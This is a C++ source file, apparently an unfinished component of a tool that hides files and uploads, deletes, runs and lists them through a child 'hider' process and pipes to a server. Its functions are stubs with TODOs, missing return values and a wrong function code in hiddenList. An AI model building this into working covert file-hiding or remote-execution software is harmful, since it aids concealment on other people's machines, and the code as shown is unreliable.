#include "HiderManeger.h"

HiderManeger::HiderManeger(std::string path)
{
    hiderPath = path;
    HtMredirect = false;
    MtHredirect = false;
}

Error HiderManeger::activateHider(FunCode fncode, std::string param)
{
    // execl hider as child
    // if pipes are open use dup
    // command line argument - funcode
    // return the return value of exec
}

Error HiderManeger::openPipes(int p[])
{
    if (pipe(p) == -1) {
        return Error::HIDER_PIPE_ERROR;
    }
    return Error::SUCCSESS;
}

Error HiderManeger::hiddenUpload(std::string param)
{
    openPipes(mthpipe);
    MtHredirect = true;
    activateHider(FunCode::HIDDEN_UPLOAD, param);
    close(mthpipe[0]);
    MtHredirect = false;
    // TODO
    // loop for send and -> pipe file
    close(mthpipe[1]);
}

Error HiderManeger::hiddenDelete(std::string param)
{
    return activateHider(FUNCODES_ENUM_H::HIDDEN_DELETE, param);
}

Error HiderManeger::hiddenRun(std::string param)
{
    return activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, param);
}

Error HiderManeger::hiddenList()
{
    openPipes(htmpipe);
    HtMredirect = true;
    Error er = activateHider(FUNCODES_ENUM_H::HIDDEN_RUN, "");
    if (er) {
        return er;
    }
    HtMredirect = false;
    close(htmpipe[1]);
    // TODO
    // loop for receiving file pipe -> server
    
    bool cont = true;

    
    close(htmpipe[0]);
}